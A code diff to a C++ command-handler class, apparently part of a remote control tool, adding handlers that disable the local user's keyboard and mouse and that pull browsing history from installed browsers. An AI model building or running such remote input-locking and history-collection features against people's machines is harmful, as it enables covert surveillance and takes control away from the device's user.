@@ -11,6 +11,8 @@
 #include "KeyboardControl.h"
 #include "ChatManager.h"
 #include "WifiSearcher.h"
+#include "InputBlocker.h"
+#include "BrowserHistory.h"
 
 // Helper: Trả về JSON status chuẩn
 json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
@@ -322,4 +324,64 @@ json ProcessHandlers::getWifiInfo(const json &)
     wifiData["success"] = true;
 
     return wifiData;
+}
+
+// === INPUT BLOCKING ===
+json ProcessHandlers::blockInput(const json &)
+{
+    bool success = InputBlocker::Block();
+    if (success)
+    {
+        return {
+            {"type", "input_block_status"},
+            {"success", true},
+            {"blocked", true},
+            {"message", "Input blocked - User keyboard and mouse disabled"}};
+    }
+    return {
+        {"type", "input_block_status"},
+        {"success", false},
+        {"blocked", false},
+        {"message", "Failed to block input - Could not install hooks"}};
+}
+
+json ProcessHandlers::unblockInput(const json &)
+{
+    bool success = InputBlocker::Unblock();
+    return {
+        {"type", "input_block_status"},
+        {"success", success},
+        {"blocked", false},
+        {"message", success ? "Input unblocked - User can use keyboard and mouse" : "Failed to unblock input"}};
+}
+
+json ProcessHandlers::getBlockStatus(const json &)
+{
+    bool blocked = InputBlocker::IsBlocked();
+    return {
+        {"type", "input_block_status"},
+        {"success", true},
+        {"blocked", blocked},
+        {"message", blocked ? "Input is currently blocked" : "Input is not blocked"}};
+}
+
+// === BROWSER HISTORY ===
+json ProcessHandlers::getBrowserList(const json &)
+{
+    return BrowserHistory::GetInstalledBrowsersList();
+}
+
+json ProcessHandlers::getBrowserHistory(const json &req)
+{
+    std::string browser = req.value("browser", "");
+    int limit = req.value("limit", 500);
+
+    if (browser.empty())
+    {
+        return {{"type", "browser_history"},
+                {"success", false},
+                {"message", "Browser name is required"}};
+    }
+
+    return BrowserHistory::GetHistoryFromBrowser(browser, limit);
 }
